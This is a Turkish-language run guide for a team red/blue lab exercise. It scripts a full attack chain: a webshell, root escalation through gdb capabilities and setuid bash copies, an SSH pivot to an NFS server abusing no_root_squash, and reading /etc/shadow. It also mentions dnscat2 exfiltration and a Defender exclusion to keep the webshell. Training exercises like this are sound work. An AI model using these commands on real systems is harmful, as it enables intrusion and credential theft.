# Çalıştırma Roadmap'i — Kör Nokta (Sunum / Demo)

Bu belge, tatbikatı sıfırdan ayağa kaldırıp Rol 1 saldırı zincirini canlı göstermek için
adım adım akıştır. Sunumda bu sırayı takip et.

---

## 0. Ön koşullar (her makinede bir kez)

- VirtualBox **veya** VMware — **ama tüm ekip aynı provider'da olmalı** (ikisi karışırsa
  makineler birbirini görmez).
- Vagrant kurulu.
- Windows'ta: repo klasörünü **Defender dışlamasına** ekle (webshell dosyası silinmesin).
- `.sh` dosyaları **LF** satır sonuyla kaydedilmeli (CRLF olursa VM içinde çalışmaz).

---

## 1. Ortamı ayağa kaldır

```bash
git clone https://github.com/muhammedSeyrek/vulnhub_task.git
cd vulnhub_task
vagrant up
vagrant status      # firewall, int-dns, c2-dns, kali, web, nfs → running
```

**Web hazır mı kontrol (kali'den):**
```bash
vagrant ssh kali
curl -s http://192.168.56.10:8080/index.php     # "nginx + php-fpm ayakta"
curl -s "http://192.168.56.10:8080/shell.php?cmd=id"   # uid=33(www-data)
```
> shell.php 404 verirse: web'e gir, `/var/www/html/shell.php`'yi elle yaz (bkz. Sorun Giderme).

---

## 2. Canlı demo akışı (sunumda anlatım sırası)

**Faz 1 — Keşif (kali):**
```bash
cd /vagrant/red/recon && sudo bash recon.sh 192.168.56.10 altay.sec
```
→ "Dışarıdan sadece firewall'u görüyoruz; AXFR ile iç ağı haritaladık: www + nfs."

**Faz 2 — Web'e sızma + root (kali):**
```bash
curl -s "http://192.168.56.10:8080/shell.php?cmd=id"                     # www-data
curl -s "http://192.168.56.10:8080/shell.php?cmd=getcap%20/usr/bin/gdb"  # cap_setuid=ep
curl -s --data-urlencode 'cmd=gdb -nx -ex "python import os; os.setuid(0)" -ex "!cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash" -ex quit' "http://192.168.56.10:8080/shell.php"
curl -s "http://192.168.56.10:8080/shell.php?cmd=/tmp/rootbash%20-p%20-c%20id"   # euid=0
```
→ "Komut enjeksiyonuyla www-data olduk, gdb'nin capability'siyle root'a çıktık."

**Faz 3 — NFS'e yanal geçiş + root (web üzerinden):**
```bash
# host'ta: vagrant ssh web
/tmp/rootbash -p
python3 -c 'import os; os.setuid(0); os.setgid(0); os.execl("/bin/bash","bash","-p")'   # tam root
mount -t nfs 192.168.57.4:/var/nfs/ortak /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash && chmod 4755 /mnt/nfs/rootbash
ssh -i /root/.ssh/id_rsa_nfs -o StrictHostKeyChecking=no user@192.168.57.4
/var/nfs/ortak/rootbash -p && id      # euid=0 → NFS'te root
cat /etc/shadow                       # kritik veri
```
→ "Web root'undan NFS'e SSH ile geçtik, no_root_squash ile NFS'te de root olup /etc/shadow'u aldık."

**Faz 4 (Rol 2):** dnscat2 ile veriyi DNS tüneli üzerinden dışarı sızdırma.

---

## 3. Uzaktan / dağıtık çalışma seçenekleri

**A) Tek bilgisayarda (en basit — önerilen):**
Tüm lab tek makinede (`vagrant up`) çalışır; ~5 GB RAM yeter (16 GB rahat).
Sunumda o makineyi kim çalıştırıyorsa ekranı paylaşır. Herkes kendi fazını sırayla anlatır.

**B) Herkes kendi bilgisayarında, sunum anında bir kişi host:**
Lab tek kişide ayakta; diğerleri ekip görüşmesinde ekranı izler. En az sürtünme.

**C) Uzaktan aynı laba bağlanmak (gerçekten dağıtık isteniyorsa):**
Lab bir kişide ayakta; o kişi **Tailscale** kurar (`tailscale up`), ekip de aynı Tailscale
ağına katılır. Sonra SSH tüneliyle web'e erişim:
```bash
# lab sahibinin makinesinde çalışan kali üzerinden tünel:
vagrant ssh kali -- -L 8080:192.168.56.10:8080
# uzaktaki kişi kendi tarayıcısında:  http://localhost:8080/shell.php
```
Veya lab sahibi Tailscale IP'sini paylaşır, ekip `ssh vagrant@<tailscale-ip>` ile bağlanır.
> Not: iç makineler (web/nfs) yalnız lab host'unda görünür; dışarıya yalnız firewall/kali
> üzerinden erişilir — bu zaten senaryonun istediği şey.

---

## 4. Sunum rol sırası

| Sıra | Sunan | Kısım |
|------|-------|-------|
| 1 | Koordinasyon | Giriş + topoloji |
| 2 | Rol 1 (Red) | Faz 1–3: keşif → web root → nfs root (bu belge) |
| 3 | Rol 2 (Red) | Faz 4: dnscat2 ile DNS tüneli exfil |
| 4 | Rol 4 (Blue) | Wazuh/SOC'ta alarmın düşmesi |
| 5 | Rol 3 (Blue) | Ansible ile açıkların kapatılması |
| 6 | Koordinasyon | Kapanış |

---

## 5. Sorun Giderme (bu tatbikatta yaşandı)

- **shell.php 404 / whois görünüyor:** `vagrant destroy -f web && vagrant up web`. Hâlâ yoksa
  web'e girip elle: `sudo tee /var/www/html/shell.php` ile küçük PHP çalıştırıcı yaz,
  `chown www-data`.
- **Vagrant `Errno::EINVAL shell.php` ile patlıyor:** Defender webshell'i siliyor. Klasör
  dışlaması ekle + Koruma geçmişinden "izin ver" + `git checkout -- provisioning/web/shell.php`.
- **`mount.nfs: failed to apply fstab options`:** rootbash euid-only olduğundan mount reddediliyor.
  Çözüm: `python3 -c 'import os; os.setuid(0); os.setgid(0); os.execl("/bin/bash","bash","-p")'`
  ile **gerçek uid=0** ol, sonra mount et.
- **`/var/nfs/ortak/rootbash: No such file`:** dosya web'de `/mnt/nfs`'e yazılır ama NFS'te
  `/var/nfs/ortak` olarak görünür; çalıştırmayı **nfs makinesinde** yap, web'de değil.
- **`Connection refused` (kali→nfs 22):** normal — firewall dışarıdan iç ağa SSH'a izin vermez.
  NFS'e her erişim **web pivotu** üzerinden olmalı.

---

## 6. Bilinen kurulum notları (kaptana)

- **Provider birliği:** herkes VirtualBox ya da herkes VMware. (`virtualbox__intnet` ayarını
  VMware yok sayar; segmentasyon testleri etkilenebilir.)
- **Özel SSH anahtarı repoda:** izole lab için sorun değil ama ideal değil.
- **`hepsi` dosyası** ve yerel `Vagrantfile`/`setup.sh` değişiklikleri commit'lenmeden önce
  gözden geçirilmeli.